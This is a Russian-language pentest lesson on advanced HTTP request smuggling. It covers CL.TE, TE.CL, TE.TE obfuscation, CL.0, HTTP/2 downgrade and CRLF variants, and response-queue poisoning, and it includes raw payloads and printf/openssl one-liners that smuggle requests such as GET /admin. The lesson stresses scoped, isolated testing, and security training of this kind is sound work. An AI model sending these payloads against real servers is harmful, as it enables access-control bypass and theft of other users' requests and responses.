Базовая идея request smuggling (`web-request-smuggling`): фронтенд (proxy/CDN) и бэкенд по-разному определяют **границу запроса**, и один запрос «прячется» внутри другого. Продвинутая часть — в **вариантах** рассинхронизации и в том, как их reliably обнаружить и эксплуатировать. Это одна из самых высокооплачиваемых категорий bug bounty. Здесь — TE.TE, TE.CL, CL.TE, CL.0, H2-производные и **response-queue poisoning**.

## Теория: откуда берётся рассинхронизация

Границу запроса определяют два заголовка:
- **`Content-Length` (CL)** — длина тела в байтах.
- **`Transfer-Encoding: chunked` (TE)** — тело в чанках, конец — `0\r\n\r\n`.

Если оба присутствуют, по RFC TE имеет приоритет, но **реализации расходятся**. Возможные несоответствия:

| Тип | Фронтенд | Бэкенд | Что происходит |
|-----|----------|--------|----------------|
| **CL.TE** | использует CL | использует TE | фронтенд отдаёт по CL, бэкенд видит чанк-конец раньше → хвост уходит в следующий запрос |
| **TE.CL** | использует TE | использует CL | фронтенд читает чанки, бэкенд ждёт больше байт |
| **TE.TE** | оба TE, но один не распознаёт (obfuscation) | | обфусцированный TE игнорируется одной стороной |
| **CL.0** | — | бэкенд игнорирует тело | тело остаётся в соединении |
| **H2.CL / H2.TE** | фронтенд H2→H1.1 | бэкенд H1.1 | downgrade теряет/дублирует длины |

## Теория: обфускация TE (для TE.TE)

Чтобы одна сторона не распознала `Transfer-Encoding`, но другая — распознала, используют варианты:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked\r\n (с лишним пробелом)
Transfer-Encoding:\tchunked
Transfer-Encoding: "chunked"
X-Transfer-Encoding: chunked
```

Некоторые парсеры «снисходительны» к пробелам/регистру и примут заголовок, другие — нет.

## Теория: response-queue poisoning

Продвинутая форма: атакующий отправляет **два** запроса, где второй — «отравляющий». Фронтенд отвечает на первый, но в очереди остаётся ответ **второго**, который отдаётся **следующему** пользователю. Так можно подсунуть жертве ответ с sensitive-данными другого пользователя или заставить её браузер выполнить действие.

Ключ: точно посчитать границы и предсказать, какой ответ «сдвинется».

## Инструменты и команды

Обнаружение — **Burp Scanner** (automatic «HTTP request smuggling») и расширение **HTTP Request Smuggler** (Turbo Intruder-скрипты для TE.TE/CL.0). Ручная проверка через `openssl s_client` (сырое соединение):

```bash
# CL.TE-проба: TE: chunked с коротким чанком + хвост
printf 'POST / HTTP/1.1\r\nHost: target.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \
 | openssl s_client -quiet -connect target.local:443 -servername target.local 2>/dev/null | head -40
```

Ищите признаки: «ошибка разбора», два ответа, ответ не тому запросу, задержка (timeout от «недополученного» тела).

**Важно:** smuggling-тесты могут задевать других пользователей (отравление очереди). Делайте их только в рамках scope, изолированно, и предупреждайте координатора. Не травите общий трафик без нужды.

## Разобранный пример: CL.TE → доступ к чужому запросу

Шаг 1. Отправляем CL.TE-пробу (фронтенд по CL, бэкенд по TE):

```
POST / HTTP/1.1
Host: target.local
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Бэкенд читает `0\r\n\r\n` как конец тела и выполняет `SMUGGLED` как начало следующего запроса.

Шаг 2. Проверяем эффект: следующий запрос на сервер (например, ваш же) получает ответ от «SMUGGLED»-запроса или 404/400 не по адресу.

Шаг 3. Эскалируем: подставляем `SMUGGLED`-запрос, который выполняет действие от имени **следующей** жертвы (кража её запроса/ответа). В отчёте — точные байты и доказательство.

## Разобранный пример: CL.0 на статике

Endpoint, который не читает тело (статический редирект):

```
POST /redirect HTTP/1.1
Host: target.local
Content-Length: 34

GET /admin HTTP/1.1
Host: target.local
```

Фронтенд/бэкенд игнорирует тело `POST` (CL.0), и `GET /admin` выполнится как следующий запрос — потенциально в сессии следующего пользователя. Это тот же примитив, что в `web-client-side-desync`, но инициируемый сырым соединением.

## Частые ошибки

- **Забывать про обфускацию TE.** Плоский `TE: chunked` часто распознаётся обеими сторонами — нужны варианты.
- **Тестировать на общем трафике.** Smuggling может задеть реальных пользователей.
- **Путать CL.TE и TE.CL.** Направление «кто кого обманывает» определяет пейлоад.
- **Игнорировать HTTP/2.** На H2-таргетах нужны H2-варианты (`web-http2-attacks`).
- **Не считать границы байтов.** Ошибка в длине = проба не сработала/сломала соединение.

## Полный разбор: TE.TE обфускация (с выводом)

Когда обе стороны понимают `Transfer-Encoding`, но одна «снисходительна» к обфускации, используем варианты.

Шаг 1. Базовый тест — «мусорный» TE, который фронт может проигнорировать:

```
POST / HTTP/1.1
Host: target.local
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Фронтенд видит два TE → берёт первый (`chunked`) или отбрасывает оба; бэкенд — иначе. Возникает рассинхронизация.

Шаг 2. Отправляем сырыми байтами через openssl (curl нормализует заголовки и «починит» payload):

```bash
printf 'POST / HTTP/1.1\r\nHost: target.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.local\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \
 | openssl s_client -quiet -connect target.local:443 -servername target.local 2>/dev/null | head -40
```

Признаки успеха: **таймаут** (бэкенд ждёт завершения «спрятанного» запроса) или «два ответа» / ответ не тому запросу.

Шаг 3. Перебираем обфускации (каждая — отдельный запрос):

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (пробел перед двоеточием)
Transfer-Encoding:\tchunked          (таб)
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, identity
X-Transfer-Encoding: chunked
```

Шаг 4. Найдя рабочую пару, строим PoC: спрятанный запрос выполняет действие/уводит ответ. Не травите общий трафик.

## Reference-таблица: все варианты десинка и payload'ы

| Тип | Идея | Ключевой заголовок |
|-----|------|--------------------|
| CL.TE | фронт по CL, бэк по TE | `CL` мал, TE-чанк «0» раньше |
| TE.CL | фронт по TE, бэк по CL | TE-чанк, затем короткий CL |
| TE.TE | обфускация TE | дубль/мусор в TE |
| CL.0 | бэкенд игнорирует тело | нет TE, CL «лишний» |
| H2.CL | H2→H1.1, CL переносится | `content-length` в H2 |
| H2.TE | H2→H1.1, TE переносится | `transfer-encoding` в H2 |
| H2 CRLF | CRLF в значении заголовка H2 | `\r\n` внутри значения |
| H2 tunnelling | вложенный H1-запрос через CL | `content-length` в H2-потоке |

## H2-производные: H2.CL, H2.TE, CRLF

HTTP/2 не использует CL/TE для границ, но фронтенд пересобирает запрос в HTTP/1.1 для бэкенда:

- **H2.CL:** добавьте `content-length` в H2-запрос; при downgrade бэкенд может использовать его.
- **H2.TE:** аналогично с `transfer-encoding: chunked`.
- **CRLF в значении:** в H2 `\r\n` в значении заголовка легальны; при переводе в H1 они становятся настоящими переводами строк → инъекция:

```
foo: bar\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

- **H2 request tunnelling:** через `Content-Length` в H2-потоке «туннелируют» вложенный H1-запрос к бэкенду, обходя фронтенд-проверки.

Burp HTTP Request Smuggler умеет проверять H2-варианты (вкладка «HTTP/2»).

## Response-queue poisoning: техника и меры

- **Техника:** отправить два запроса; фронт ответит на первый, но в очереди останется ответ «отравляющего» второго, который уйдёт следующему пользователю. Нужно точно рассчитать границы.
- **Impact:** утечка чужого ответа (данные, cookie в теле), выполнение действия от имени следующего пользователя.
- **Меры предосторожности:** изолируйте тест, предупреждайте координатора, не травите общий трафик; после теста — проверьте, что очередь «чистая».
- **Связка:** часто комбинируется с cache poisoning (`web-cache-poisoning`) и с credential theft.

## Что делать дальше / решение

1. **Определить пару слоёв** (CDN/proxy + бэкенд) и версии.
2. **Прогнать HTTP Request Smuggler** (Detect) — CL.TE/TE.CL/TE.TE/CL.0/H2.
3. **Перебрать обфускации TE** (дубль, пробел, таб, мусор).
4. **Подтвердить ручными байтами** (openssl/nc), смотреть тайминги и двойные ответы.
5. **Проверить H2-варианты** (H2.CL/TE, CRLF, tunnelling).
6. **Оценить impact** (ACL bypass, WAF bypass, queue poisoning) — аккуратно, без вреда другим.
7. **Оформить PoC** с точными байтами и описанием рассинхронизации.

## Отличие от CSD и порядок тестирования

| Признак | Server-side smuggling (этот урок) | Client-side desync |
|---------|----------------------------------|--------------------|
| Инициатор | ваш сырой сокет | браузер жертвы |
| Канал | proxy↔backend | browser↔frontend (keep-alive) |
| Условие | расхождение CL/TE между слоями | сервер игнорирует тело (CL.0) |
| Жертва | другие пользователи через прокси | сама жертва |
| Инструмент | Burp raw / HTTP Request Smuggler | браузерный JS + Scanner |

**Порядок тестирования:**

1. Определить стек (CDN/proxy/backend), версии.
2. Прогнать HTTP Request Smuggler (Detect) — CL.TE/TE.CL/TE.TE/CL.0.
3. Перебрать обфускации TE.
4. Подтвердить ручными байтами (openssl/nc), смотреть тайминги.
5. Проверить H2-варианты.
6. Оценить impact; не травить общий трафик.

Начинайте с наименее разрушительных проб (детект без спрятанного запроса), переходите к PoC только после подтверждения и с осторожностью.

## Итог по advanced smuggling

Продвинутый smuggling — это перебор **вариантов** рассинхронизации (CL.TE, TE.CL, TE.TE, CL.0, H2-производные) и обфускаций TE, подтверждаемый сырыми байтами. Response-queue poisoning — самая мощная форма, но и самая рискованная для других пользователей: тестируйте изолированно, с согласования, и не травите общий трафик.
